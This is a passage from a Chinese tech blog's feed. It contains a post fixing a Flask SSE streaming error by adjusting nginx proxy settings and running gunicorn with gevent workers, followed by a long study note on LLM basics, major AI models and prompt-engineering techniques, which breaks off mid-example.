    <content type="html"><![CDATA[<h1><span id="起因">起因</span></h1><p>当我使用flask开发了一个SSE流式输出大模型返回内容的接口，前端调用时返回到一半出现<code>net::ERR_HTTP2_PROTOCOL_ERROR 200 (OK)</code>，排查了一天，各种nginx配置都试过了，无论是强制HTTP1还是设置缓冲大小都不管用。</p><p>最终当我试试关掉gunicorn,直接使用python app.py 运行flask时一切正常了！ </p><h1><span id="解决">解决</span></h1><h3><span id="nginx配置">nginx配置</span></h3><p>首先是nginx要正确配置返回头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;system&#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:8008&#x2F;;</span><br><span class="line">    # 配置支持sse</span><br><span class="line">    proxy_set_header Connection &#39;Keep-Alive&#39;;  </span><br><span class="line">    proxy_set_header Host $http_host;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_set_header Connection &#39;&#39;;</span><br><span class="line">    proxy_http_version 1.1;  # 重要：确保使用HTTP&#x2F;1.1协议</span><br><span class="line">    proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">    proxy_set_header Connection &#39;upgrade&#39;;</span><br><span class="line">    # 添加以下配置以处理SSE</span><br><span class="line">    proxy_buffering off;</span><br><span class="line">    proxy_cache off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="其次是gunicorn启动命令">其次是gunicorn启动命令</span></h3><p>Gunicorn 的默认 sync 工作进程不适合长连接，因此使用异步工作进程如 gevent。</p><p>首先：<br><code>pip install gevent</code></p><p>再执行启动命令：<br><code>gunicorn --worker-class gevent --workers 4 --bind 0.0.0.0:8008 your_app:app</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;起因&quot;&gt;起因&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;当我使用flask开发了一个SSE流式输出大模型返回内容的接口，前端调用时返回到一半出现&lt;code&gt;net::ERR_HTTP2_PROTOCOL_ERROR 200 (OK)&lt;/code&gt;，排查了一天，各种n</summary>
      
    
    
    
    <category term="运维" scheme="https://reiner.host/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
    <category term="nginx" scheme="https://reiner.host/tags/nginx/"/>
    
    <category term="flask" scheme="https://reiner.host/tags/flask/"/>
    
    <category term="sse" scheme="https://reiner.host/tags/sse/"/>
    
  </entry>
  
  <entry>
    <title>AI应用工程知识点整理</title>
    <link href="https://reiner.host/posts/3943ac5e.html"/>
    <id>https://reiner.host/posts/3943ac5e.html</id>
    <published>2025-04-21T04:57:12.000Z</published>
    <updated>2025-04-21T05:00:48.119Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="什么是大语言模型">什么是大语言模型？</span></h1><p>大语言模型（LLM）是一种 人工智能模型，它被设计用来 理解和生成人类语言。 关键在于 “大” 和 “语言模型” 这两个词：</p><ul><li><p>“大” (Large): 指的是模型具有 庞大的规模，主要体现在两个方面：</p><ul><li><p>大规模的训练数据： LLM 是在海量的文本数据上训练出来的，这些数据通常包括互联网上的文本、书籍、文章、代码等等，数量级可以达到 TB 甚至 PB 级别。</p></li><li><p>大规模的参数量： 模型的内部结构（通常是基于 Transformer 架构的神经网络）拥有数亿、数十亿甚至数千亿的参数。参数越多，模型理论上可以学习和存储的信息就越多，能力也更强。</p></li></ul></li><li><p>“语言模型” (Language Model): 指的是模型的核心任务是 预测文本序列的概率分布。 简单来说，给定一段文本（例如，句子的一部分），语言模型的目标是预测接下来最有可能出现的词语。 虽然目标看似简单，但为了做好这个预测，模型必须学习到语言的各种规律，包括：</p><ul><li><p>语法规则： 词语的正确排列顺序，句子的结构。</p></li><li><p>语义信息： 词语和句子的含义，上下文的理解。</p></li><li><p>世界知识： 模型通过学习大量文本，间接地学习到了关于世界的知识。</p></li><li><p>语用信息： 语言在不同情境下的使用方式，风格，语气等等。</p></li></ul></li></ul><p>总的来说，LLM 就是通过学习海量文本数据，拥有了理解和生成人类语言能力的超大规模神经网络模型。</p><h2><span id="人工智能常见领域">人工智能常见领域</span></h2><ul><li><p><strong>计算机视觉 (CV)：</strong></p><ul><li><p>图像分类、目标检测、图像分割、图像生成</p></li><li><p>常用模型：ResNet、YOLO、Mask R-CNN、GANs</p></li></ul></li><li><p><strong>自然语言处理 (NLP)：</strong></p><ul><li><p>文本分类、情感分析、机器翻译、文本生成、问答系统</p></li><li><p>常用模型：Word2Vec、GloVe、BERT、Transformer、GPT</p></li></ul></li><li><p><strong>语音识别 (ASR)：</strong></p><ul><li><p>语音转文本、语音合成</p></li><li><p>常用模型：DeepSpeech、Wav2Vec</p></li></ul></li><li><p><strong>推荐系统：</strong></p><ul><li>协同过滤、基于内容的推荐、混合推荐</li></ul></li><li><p><strong>强化学习 (RL)：</strong></p><ul><li><p>马尔可夫决策过程 (MDP)</p></li><li><p>Q-learning、Deep Q-Network (DQN)</p></li><li><p>策略梯度</p></li><li><p>应用场景：推荐系统、金融交易、游戏等</p></li></ul></li><li><p>时间序列分析</p><ul><li>应用场景：预测股票价格、汇率走势和市场趋势、预测天气变化和气候变化预测交通流量和路况等</li></ul></li></ul><h1><span id="主流ai大模型">主流AI大模型</span></h1><p><strong>一、 文本生成与理解类模型 (以自然语言处理为主)</strong></p><ul><li><p><strong>1. OpenAI GPT 系列 (GPT-3, GPT-3.5, GPT-4, GPT-4 Turbo等)</strong></p><ul><li><p><strong>开发者:</strong> OpenAI</p></li><li><p><strong>架构:</strong> Decoder-only Transformer (自回归模型)</p></li><li><p><strong>训练数据:</strong> 海量的文本和代码数据，包括互联网文本、书籍、代码库等，规模庞大且质量高。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>强大的文本生成能力:</strong> 在文本生成、代码生成、创意写作、对话等方面表现卓越，生成文本流畅自然，逻辑连贯。</p></li><li><p><strong>上下文学习 (In-context Learning):</strong> 能够根据Prompt (提示词) 中的少量示例快速适应新任务，无需针对特定任务进行微调。</p></li><li><p><strong>指令遵循能力 (Instruction Following):</strong> 经过指令微调 (Instruction Tuning) 后，能更好地理解和执行用户指令，并生成符合指令的输出。</p></li><li><p><strong>多模态能力 (GPT-4):</strong> GPT-4 具备处理图像输入的能力，可以进行图像描述、视觉问答等任务，是真正的多模态大模型。</p></li><li><p><strong>持续进化:</strong> OpenAI 不断迭代和更新 GPT 系列模型，性能持续提升，例如 GPT-4 Turbo 拥有更长的上下文窗口，更低的API价格。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>顶尖的文本生成质量和理解能力。</strong></p></li><li><p><strong>强大的通用性和泛化能力，适用范围广泛。</strong></p></li><li><p><strong>成熟的 API 服务和生态系统，易于集成和使用。</strong></p></li><li><p><strong>持续创新和迭代，性能不断提升。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>API 访问成本相对较高 (特别是 GPT-4)。</strong></p></li><li><p><strong>模型细节和训练数据相对封闭 (特别是 GPT-4)。</strong></p></li><li><p><strong>有时会产生幻觉 (Hallucination)，即生成不真实或与事实不符的内容。</strong></p></li><li><p><strong>在某些特定领域或专业任务上，可能不如领域特定模型。</strong></p></li><li><p><strong>对 Prompt 工程依赖性较高，需要精心设计 Prompt 才能发挥最佳性能。</strong></p></li></ul></li></ul></li><li><p><strong>2. Google PaLM 系列 (PaLM 2, Gemini 等)</strong></p><ul><li><p><strong>开发者:</strong> Google</p></li><li><p><strong>架构:</strong> Decoder-only Transformer (PaLM 2)，Transformer-based (Gemini)</p></li><li><p><strong>训练数据:</strong> 海量的文本和代码数据，规模庞大，并侧重于高质量、多语言和多领域数据。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>强大的多语言能力:</strong> PaLM 2 在多语言理解和生成方面表现突出，支持超过100种语言。</p></li><li><p><strong>强大的推理能力:</strong> Gemini 系列模型 (特别是 Gemini Ultra) 在多项基准测试中表现出色，展现了强大的推理和理解能力，尤其在数学、逻辑推理等方面。</p></li><li><p><strong>多模态原生支持 (Gemini):</strong> Gemini 从设计之初就考虑了多模态，能够原生处理文本、图像、音频、视频等多种模态的数据，实现真正的多模态理解和生成。</p></li><li><p><strong>Google 生态集成:</strong> 与 Google 搜索、Android 系统、Google Cloud 等生态系统深度集成，应用潜力巨大。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>顶尖的多语言能力和强大的推理能力 (特别是 Gemini)。</strong></p></li><li><p><strong>原生多模态支持 (Gemini)，具有广阔的应用前景。</strong></p></li><li><p><strong>背靠 Google 强大的技术实力和生态系统。</strong></p></li><li><p><strong>持续发展和迭代，Gemini 系列模型有望成为 GPT 系列的强有力竞争者。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>API 访问和生态系统相对 GPT 系列稍逊 (但正在快速发展)。</strong></p></li><li><p><strong>Gemini Ultra 的访问权限目前较为受限。</strong></p></li><li><p><strong>模型细节和训练数据相对封闭。</strong></p></li><li><p><strong>在某些特定任务上，可能需要进一步优化和微调。</strong></p></li></ul></li></ul></li><li><p><strong>3. Meta Llama 系列 (Llama 2, Llama 3 等)</strong></p><ul><li><p><strong>开发者:</strong> Meta (原 Facebook)</p></li><li><p><strong>架构:</strong> Decoder-only Transformer (Llama 2)，Transformer-based (Llama 3)</p></li><li><p><strong>训练数据:</strong> 大规模的公开可用的文本数据，侧重于透明度和可复现性。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>开源和可商用:</strong> Llama 2 系列模型开源且允许商业用途，降低了使用门槛，促进了社区发展。 Llama 3 延续开源策略。</p></li><li><p><strong>性能接近甚至在某些方面超越 GPT-3.5:</strong> Llama 2 在某些基准测试中表现出色，性能接近甚至在某些方面超越了 GPT-3.5。 Llama 3 更进一步，性能更强大。</p></li><li><p><strong>多种尺寸版本:</strong> 提供多种参数规模的版本 (7B, 13B, 70B 等)，满足不同资源和应用场景的需求。</p></li><li><p><strong>社区支持和生态快速发展:</strong> 开源特性吸引了大量开发者和研究者参与，社区活跃，生态系统快速发展，涌现出各种基于 Llama 的应用和工具。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>开源和可商用，极大降低了使用门槛。</strong></p></li><li><p><strong>高性能，在某些方面可媲美甚至超越闭源模型 (如 GPT-3.5)。</strong></p></li><li><p><strong>多种尺寸版本，灵活性高。</strong></p></li><li><p><strong>强大的社区支持和活跃的生态系统。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>性能上整体相比 GPT-4 和 Gemini 仍有差距 (但 Llama 3 正在缩小差距)。</strong></p></li><li><p><strong>在某些复杂任务或多模态任务上，能力相对较弱。</strong></p></li><li><p><strong>开源模型需要一定的技术能力进行部署和维护。</strong></p></li></ul></li></ul></li><li><p><strong>4. Anthropic Claude 系列 (Claude 2, Claude 3 等)</strong></p><ul><li><p><strong>开发者:</strong> Anthropic</p></li><li><p><strong>架构:</strong> Transformer-based (Claude 2, Claude 3)</p></li><li><p><strong>训练数据:</strong> 大规模的文本和代码数据，侧重于安全性和负责任的AI开发。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>强调安全和负责任的AI:</strong> Anthropic 致力于开发安全、可靠、对人类有益的AI模型，Claude 系列模型在安全性方面进行了特别设计和优化。</p></li><li><p><strong>长上下文窗口:</strong> Claude 2 拥有超长的上下文窗口 (100K tokens, Claude 3 Opus 达到 200K tokens)，能够处理更长的文本输入，例如整本书籍或长篇文档。 Claude 3 Sonnet 和 Haiku 的上下文窗口也达到 200K tokens。</p></li><li><p><strong>强大的理解和推理能力:</strong> Claude 3 Opus 在复杂推理、数学、代码生成等方面表现出色，在某些基准测试中甚至超越了 GPT-4 和 Gemini Ultra。</p></li><li><p><strong>多种版本 (Claude 3):</strong> Claude 3 系列提供 Opus (最强性能)、Sonnet (性能和速度平衡)、Haiku (最快速度和低成本) 三个版本，满足不同需求。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>强调安全和负责任的AI开发理念。</strong></p></li><li><p><strong>超长的上下文窗口，擅长处理长文本输入。</strong></p></li><li><p><strong>强大的理解和推理能力 (特别是 Claude 3 Opus)。</strong></p></li><li><p><strong>Claude 3 系列提供多种版本，选择更灵活。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>API 访问和生态系统相对 GPT 系列和 Google 稍弱。</strong></p></li><li><p><strong>模型细节和训练数据相对封闭。</strong></p></li><li><p><strong>在某些任务上，例如代码生成，可能不如专门的代码生成模型。</strong></p></li></ul></li></ul></li><li><p><strong>5. Baidu ERNIE 系列 (ERNIE 3.0 Titan, ERNIE Bot 4.0 等)</strong></p><ul><li><p><strong>开发者:</strong> 百度</p></li><li><p><strong>架构:</strong> Transformer-based (ERNIE 3.0 Titan, ERNIE Bot 4.0)</p></li><li><p><strong>训练数据:</strong> 大规模中文和英文文本数据，侧重于中文理解和生成能力。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>强大的中文理解和生成能力:</strong> ERNIE 系列模型在中文 NLP 任务上表现出色，尤其在中文文本生成、中文问答、中文信息检索等方面。</p></li><li><p><strong>知识增强 (Knowledge Enhanced):</strong> ERNIE 模型融入了知识图谱等知识信息，增强了模型的知识理解和推理能力。</p></li><li><p><strong>多任务学习:</strong> ERNIE 模型采用多任务学习框架进行训练，提升了模型的通用性和泛化能力。</p></li><li><p><strong>百度生态集成:</strong> 与百度搜索、百度智能云等生态系统深度集成，应用场景广泛。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>顶尖的中文理解和生成能力，在中文 NLP 领域具有优势。</strong></p></li><li><p><strong>知识增强，提升了知识理解和推理能力。</strong></p></li><li><p><strong>百度生态集成，应用场景广泛。</strong></p></li><li><p><strong>针对中文市场和用户进行了优化。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>英文能力相对 GPT 系列和 Google 等模型稍弱。</strong></p></li><li><p><strong>模型细节和训练数据相对封闭。</strong></p></li><li><p><strong>国际化程度相对较低，主要服务于中文市场。</strong></p></li></ul></li></ul></li><li><p><strong>6. 清华大学 ChatGLM 系列 (ChatGLM3 等)</strong></p><ul><li><p><strong>开发者:</strong> 清华大学 KEG 实验室</p></li><li><p><strong>架构:</strong> Transformer-based (ChatGLM3)</p></li><li><p><strong>训练数据:</strong> 大规模中英文文本数据，侧重于开源和研究。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>开源和免费可商用 (部分版本):</strong> ChatGLM3 部分版本开源且免费可商用，降低了使用门槛，促进了学术研究和商业应用。</p></li><li><p><strong>强大的中文能力:</strong> ChatGLM 系列模型在中文 NLP 任务上表现出色，尤其在中文对话、中文问答等方面。</p></li><li><p><strong>轻量化版本 (ChatGLM3-6B):</strong> 提供轻量化版本 (ChatGLM3-6B)，资源需求较低，可以在消费级硬件上部署和运行。</p></li><li><p><strong>插件机制 (Tool API):</strong> ChatGLM3 提供了 Tool API，允许模型调用外部工具，扩展了模型的功能。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>开源和免费可商用 (部分版本)，便于研究和应用。</strong></p></li><li><p><strong>强大的中文能力，尤其在中文对话领域。</strong></p></li><li><p><strong>轻量化版本，资源需求低，易于部署。</strong></p></li><li><p><strong>插件机制，扩展了模型的功能。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>英文能力相对 GPT 系列和 Google 等模型稍弱。</strong></p></li><li><p><strong>模型规模相对较小，整体性能相比顶尖闭源模型仍有差距 (但轻量化和开源是其优势)。</strong></p></li><li><p><strong>生态系统和社区规模相对较小 (但正在快速发展)。</strong></p></li></ul></li></ul></li><li><p><strong>7. 智谱 AI ChatYuan 系列 (ChatYuan-Large 等)</strong></p><ul><li><p><strong>开发者:</strong> 智谱 AI</p></li><li><p><strong>架构:</strong> Transformer-based (ChatYuan-Large)</p></li><li><p><strong>训练数据:</strong> 大规模中英文文本数据，侧重于中文通用能力。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>强大的中文通用能力:</strong> ChatYuan 系列模型在中文通用能力方面表现出色，适用于多种中文 NLP 任务。</p></li><li><p><strong>指令遵循和对话能力:</strong> 经过指令微调，具备较好的指令遵循能力和对话能力。</p></li><li><p><strong>多领域应用:</strong> ChatYuan 模型应用于金融、法律、教育等多个领域。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>强大的中文通用能力。</strong></p></li><li><p><strong>指令遵循和对话能力较好。</strong></p></li><li><p><strong>多领域应用场景。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>英文能力相对 GPT 系列和 Google 等模型稍弱。</strong></p></li><li><p><strong>模型细节和训练数据相对封闭。</strong></p></li><li><p><strong>社区和生态系统规模相对较小。</strong></p></li></ul></li></ul></li></ul><p><strong>二、 代码生成类模型</strong></p><ul><li><p><strong>1. OpenAI Codex (基于 GPT 系列)</strong></p><ul><li><p><strong>开发者:</strong> OpenAI</p></li><li><p><strong>架构:</strong> Decoder-only Transformer (基于 GPT 系列)</p></li><li><p><strong>训练数据:</strong> 海量的代码数据，包括 GitHub 代码库、公开代码数据集等。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>强大的代码生成能力:</strong> 能够根据自然语言描述或代码注释生成代码片段或完整程序。</p></li><li><p><strong>支持多种编程语言:</strong> 支持 Python, JavaScript, C++, Java, Go 等多种主流编程语言。</p></li><li><p><strong>代码补全和代码修复:</strong> 可以进行代码自动补全、代码错误检测和修复等任务。</p></li><li><p><strong>集成于 GitHub Copilot 等工具:</strong> Codex 模型是 GitHub Copilot 等代码生成工具的核心引擎。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>顶尖的代码生成质量和能力。</strong></p></li><li><p><strong>支持多种编程语言。</strong></p></li><li><p><strong>集成于流行的开发工具，易于使用。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>API 访问成本相对较高。</strong></p></li><li><p><strong>模型细节和训练数据相对封闭。</strong></p></li><li><p><strong>在某些复杂或特定领域的代码生成任务上，可能需要人工辅助。</strong></p></li></ul></li></ul></li><li><p><strong>2. Google Codey (基于 PaLM 2)</strong></p><ul><li><p><strong>开发者:</strong> Google</p></li><li><p><strong>架构:</strong> Decoder-only Transformer (基于 PaLM 2)</p></li><li><p><strong>训练数据:</strong> 海量的代码数据，包括公开代码库、Google 内部代码数据等。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>强大的代码生成和代码理解能力:</strong> Codey 模型在代码生成、代码补全、代码解释等方面表现出色。</p></li><li><p><strong>多语言支持:</strong> 支持 Python, JavaScript, Java, Go, C++ 等多种编程语言，并侧重于多语言代码生成能力。</p></li><li><p><strong>与 Google Cloud 集成:</strong> Codey 模型与 Google Cloud Codey API 和 Google Cloud Workbench 等工具集成，方便开发者使用。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>强大的代码生成和代码理解能力。</strong></p></li><li><p><strong>多语言支持，尤其在多语言代码生成方面具有优势。</strong></p></li><li><p><strong>与 Google Cloud 生态集成，方便云端开发。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>API 访问和生态系统相对 OpenAI 稍逊 (但正在快速发展)。</strong></p></li><li><p><strong>模型细节和训练数据相对封闭。</strong></p></li><li><p><strong>在某些复杂或特定领域的代码生成任务上，可能需要人工辅助。</strong></p></li></ul></li></ul></li><li><p><strong>3. Meta Code Llama 系列 (Code Llama, Code Llama - Instruct 等)</strong></p><ul><li><p><strong>开发者:</strong> Meta</p></li><li><p><strong>架构:</strong> Decoder-only Transformer (基于 Llama 2)</p></li><li><p><strong>训练数据:</strong> 海量的代码数据，包括公开代码库、Stack Overflow 等。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>开源和免费可商用:</strong> Code Llama 系列模型开源且允许商业用途，降低了使用门槛。</p></li><li><p><strong>多种尺寸版本:</strong> 提供多种参数规模的版本 (7B, 13B, 34B 等)，满足不同资源和应用场景的需求。</p></li><li><p><strong>指令微调版本 (Code Llama - Instruct):</strong> 提供指令微调版本，针对代码生成指令进行了优化，更易于使用。</p></li><li><p><strong>支持多种编程语言:</strong> 支持 Python, C++, Java, PHP, TypeScript, C#, Bash, SQL 等多种编程语言。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>开源和免费可商用，极大降低了使用门槛。</strong></p></li><li><p><strong>高性能的代码生成能力，可媲美闭源模型。</strong></p></li><li><p><strong>多种尺寸版本和指令微调版本，灵活性高。</strong></p></li><li><p><strong>基于 Llama 2 开源生态，社区支持良好。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>在某些极端复杂的代码生成任务上，可能不如顶尖闭源模型。</strong></p></li><li><p><strong>开源模型需要一定的技术能力进行部署和维护。</strong></p></li><li><p><strong>生态系统相对 OpenAI 和 Google 稍逊 (但正在快速发展)。</strong></p></li></ul></li></ul></li></ul><p><strong>三、 多模态模型</strong></p><ul><li><p><strong>1. OpenAI GPT-4 (多模态版本)</strong></p><ul><li><p><strong>开发者:</strong> OpenAI</p></li><li><p><strong>架构:</strong> Transformer-based (多模态 Transformer)</p></li><li><p><strong>训练数据:</strong> 文本、图像、音频、视频等多种模态的数据。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>原生多模态支持:</strong> 能够处理文本、图像输入，并生成文本输出，实现图像描述、视觉问答等多模态任务。</p></li><li><p><strong>强大的多模态理解和生成能力:</strong> 在多模态任务上表现出色，例如图像描述准确生动，视觉问答逻辑清晰。</p></li><li><p><strong>与 GPT 系列文本能力无缝衔接:</strong> 多模态能力与 GPT 系列强大的文本能力无缝衔接，可以实现更复杂的多模态应用。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>顶尖的多模态理解和生成能力。</strong></p></li><li><p><strong>与 GPT 系列文本能力融合，应用潜力巨大。</strong></p></li><li><p><strong>成熟的 API 服务和生态系统。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>API 访问成本更高 (相比纯文本模型)。</strong></p></li><li><p><strong>模型细节和多模态训练数据相对封闭。</strong></p></li><li><p><strong>多模态能力仍处于发展初期，可能存在一些局限性。</strong></p></li></ul></li></ul></li><li><p><strong>2. Google Gemini 系列 (Gemini Ultra, Gemini Pro, Gemini Nano)</strong></p><ul><li><p><strong>开发者:</strong> Google</p></li><li><p><strong>架构:</strong> Transformer-based (原生多模态 Transformer)</p></li><li><p><strong>训练数据:</strong> 文本、图像、音频、视频等多种模态的大规模数据。</p></li><li><p><strong>关键特点:</strong></p><ul><li><p><strong>原生多模态架构:</strong> Gemini 从设计之初就考虑了多模态，采用原生多模态 Transformer 架构，能够更有效地融合和处理多种模态的数据。</p></li><li><p><strong>顶尖的多模态性能:</strong> Gemini Ultra 在多项多模态基准测试中表现出色，超越了 GPT-4 等模型。</p></li><li><p><strong>多种尺寸版本:</strong> Gemini 系列提供 Ultra (最强性能), Pro (性能和效率平衡), Nano (移动端部署) 三个版本，满足不同需求。</p></li><li><p><strong>Google 生态集成:</strong> 与 Google 搜索、Android 系统、Google Cloud 等生态系统深度集成，多模态应用场景广阔。</p></li></ul></li><li><p><strong>优点:</strong></p><ul><li><p><strong>顶尖的多模态性能，在多模态领域具有领先优势。</strong></p></li><li><p><strong>原生多模态架构，更有效地融合和处理多模态数据。</strong></p></li><li><p><strong>多种尺寸版本，灵活性高。</strong></p></li><li><p><strong>背靠 Google 强大的技术实力和生态系统，应用前景广阔。</strong></p></li></ul></li><li><p><strong>缺点:</strong></p><ul><li><p><strong>Gemini Ultra 的访问权限目前较为受限。</strong></p></li><li><p><strong>API 访问和生态系统相对 GPT 系列稍逊 (但正在快速发展)。</strong></p></li><li><p><strong>模型细节和多模态训练数据相对封闭。</strong></p></li><li><p><strong>多模态能力仍处于发展初期，仍有提升空间。</strong></p></li></ul></li></ul></li></ul><p><strong>总结与选择建议:</strong></p><p>选择合适的AI大模型需要根据具体的应用场景、需求和资源情况进行权衡：</p><ul><li><p><strong>文本生成与理解任务:</strong></p><ul><li><p><strong>追求顶尖性能和通用性:</strong> <strong>GPT-4</strong> 或 <strong>Gemini Ultra</strong> 是首选，但成本较高。</p></li><li><p><strong>追求高性能和相对较低成本:</strong> <strong>GPT-3.5 Turbo</strong>, <strong>PaLM 2</strong>, <strong>Claude 3 Sonnet/Opus</strong> 是不错的选择。</p></li><li><p><strong>追求开源和可商用:</strong> <strong>Llama 3</strong> 或 <strong>Code Llama</strong> 系列是最佳选择。</p></li><li><p><strong>中文 NLP 任务:</strong> <strong>ERNIE Bot 4.0</strong> 或 <strong>ChatGLM3</strong> 系列在中文领域具有优势。</p></li></ul></li><li><p><strong>代码生成任务:</strong></p><ul><li><p><strong>追求顶尖代码生成能力:</strong> <strong>Codex (GitHub Copilot)</strong> 或 <strong>Codey</strong> 是首选。</p></li><li><p><strong>追求开源和可商用:</strong> <strong>Code Llama</strong> 系列是最佳选择。</p></li></ul></li><li><p><strong>多模态任务:</strong></p><ul><li><p><strong>追求顶尖多模态性能:</strong> <strong>Gemini Ultra</strong> 或 <strong>GPT-4 (多模态版本)</strong> 是首选，但成本较高。</p></li><li><p><strong>需要考虑成本和易用性:</strong> <strong>Gemini Pro</strong> 或 <strong>GPT-4 (多模态版本)</strong> 的API 也是可行的选择。</p></li></ul></li></ul><span id="more"></span><h1><span id="prompt-engineering-提示工程">Prompt Engineering (提示工程)</span></h1><p><strong>1. 什么是 Prompt Engineering？ (核心概念)</strong></p><p>Prompt Engineering (提示工程) 关注于 <strong>设计和优化 “提示” (Prompts) ，以有效地引导大语言模型 (LLM) 产生期望的输出结果。</strong></p><ul><li><p><strong>“Prompt” (提示):</strong> 指的是你提供给 LLM 的 <strong>输入文本</strong>，用来指示模型你想要它做什么。 Prompt 可以是一个问题、一个指令、一个不完整的句子、甚至是一段对话的开头。</p></li><li><p><strong>“Engineering” (工程):</strong> 提示工程不仅仅是随意写几句话，而是一个 <strong>系统化、迭代优化</strong> 的过程。 它涉及到：</p><ul><li><p><strong>理解 LLM 的能力和局限性：</strong> 你需要知道 LLM 擅长什么，不擅长什么，才能设计出有效的 Prompt。</p></li><li><p><strong>掌握 Prompt 设计技巧：</strong> 学习各种 Prompt 设计策略，例如清晰指令、上下文提供、角色扮演、少样本学习等等。</p></li><li><p><strong>实验和迭代：</strong> 通过不断尝试不同的 Prompt，观察模型输出，并根据结果进行调整和优化，最终找到最佳的 Prompt。</p></li></ul></li></ul><p><strong>可以把 Prompt 理解为与 LLM 沟通的 “语言” 或 “指令” 。 Prompt Engineering 就是学习如何用 LLM 能理解的语言，清晰、有效地告诉它你需要它做什么。</strong></p><h2><span id="prompt-engineering-的核心技巧和策略">Prompt Engineering 的核心技巧和策略</span></h2><p>以下是一些常用的 Prompt 设计技巧和策略：</p><ul><li><p><strong>清晰明确的指令 (Clear and Specific Instructions):</strong> 这是最基本也是最重要的原则。 Prompt 应该尽可能地清晰、明确、具体，避免歧义和模糊不清的表达。 告诉模型 <strong>做什么 (What to do)**，</strong>怎么做 (How to do it)<strong>，</strong>输出什么格式 (Output format)**。</p><ul><li><p><strong>反例：</strong> “写一篇关于猫的文章。” (太笼统)</p></li><li><p><strong>正例：</strong> “请写一篇 300 字左右的文章，介绍家猫的品种、生活习性以及如何照顾它们。文章的目标读者是想要养猫的初学者。文章风格应该轻松活泼。” (更具体、更清晰)</p></li></ul></li><li><p><strong>提供上下文信息 (Provide Context):</strong> 如果任务需要一定的背景知识或上下文，需要在 Prompt 中提供相关信息，帮助模型更好地理解你的意图。</p><ul><li><strong>例子：</strong> “用户评论：’这家餐厅的披萨很好吃，但是服务太慢了。’ 请根据这条评论，判断用户对这家餐厅的整体评价是正面、负面还是中性。” (提供了用户评论作为上下文)</li></ul></li><li><p><strong>角色扮演 (Role-Playing/Persona):</strong> 指示 LLM 扮演特定的角色，例如 “你是一个专业的客服人员”， “你是一个历史学家”， “你是一个代码助手” 等等。 这可以引导模型以更符合角色设定的风格和知识来生成回复。</p><ul><li><strong>例子：</strong> “请你扮演一个经验丰富的旅行顾问，为一位计划去日本旅游的游客推荐三个值得去的城市，并简要说明理由。”</li></ul></li><li><p><strong>指定输出格式 (Specify Output Format):</strong> 明确告诉模型你期望的输出格式，例如 “以列表形式输出”， “以 JSON 格式输出”， “生成一段代码” 等等。</p><ul><li><strong>例子：</strong> “请列出 5 部评分最高的科幻电影，并以 Markdown 列表形式输出，每项包括电影名称和评分。”</li></ul></li><li><p><strong>少样本学习 (Few-shot Learning):</strong> 在 Prompt 中提供一些 **示例 (Examples)**，展示你期望的输入和输出的对应关系。 这可以帮助 LLM 更好地理解任务，尤其是在任务比较复杂或难以用语言精确描述时。</p><ul><li><p><strong>例子：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;我今天心情很糟糕。&quot;  情感: 负面</span><br><span class="line">输入: &quot;这部电影太精彩了！&quot; 情感: 正面</span><br><span class="line">输入: &quot;天气晴朗。&quot;  情感: 中性</span><br><span class="line">输入: &quot;我考试考砸了。&quot; 